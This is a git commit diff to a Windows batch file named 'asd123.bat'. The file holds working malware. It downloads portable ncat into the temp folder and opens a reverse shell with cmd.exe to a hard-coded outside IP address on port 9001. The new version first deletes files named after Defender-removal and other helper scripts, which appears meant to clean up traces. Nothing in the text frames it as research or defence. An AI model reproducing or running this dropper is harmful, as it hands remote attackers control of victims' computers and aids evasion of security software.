57f8d3d070a0afa6b1f55bfe52aba3f4da36f4c0
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-03 17:15:34 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -1,3 +1,24 @@
-cd %temp%
-curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe 
-ncat.exe 185.194.175.132 9001 -e cmd.exe
+@echo off
+
+where ncat.exe >nul 2>&1
+if %errorlevel%==0 (
+    del /f /q s.bat
+    del /f /q a.py
+    del /f /q asd.bat
+    del /f /q ddd.vbs
+    del /f /q expe2.bat
+    del /f /q expe2.vbs
+    del /f /q lalala.vbs
+    del /f /q a.ps1
+    del /f /q RunDefenderRemover.vbs
+    del /f /q DefenderRemover.bat
+
+    rmdir /s /q Remove_SecurityComp
+    rmdir /s /q Remove_Defender
+
+    cd %temp%
+    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
+    ncat.exe 185.194.175.132 9001 -e cmd.exe
+) else (
+    exit
+)
